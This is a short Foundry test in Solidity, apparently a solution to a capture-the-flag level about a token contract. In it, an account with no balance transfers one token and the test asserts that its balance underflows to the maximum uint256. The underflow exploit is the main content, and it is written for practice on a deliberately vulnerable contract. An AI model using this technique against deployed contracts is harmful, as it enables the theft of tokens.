pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "forge-std/console2.sol";

import "src/06.sol";

contract Test06 is Test {

    address user = address(0x1);
    Token instance;
    
    function setUp() public {
        instance = new Token(10 ether);
    }

    function testSolve() public {
        vm.prank(user);
        instance.transfer(address(0x2), 1);

        uint balanceAfter = instance.balanceOf(user);
        console.log("Balance after Underflow: ", balanceAfter);
        assertEq(balanceAfter, uint256(-1));
    }

}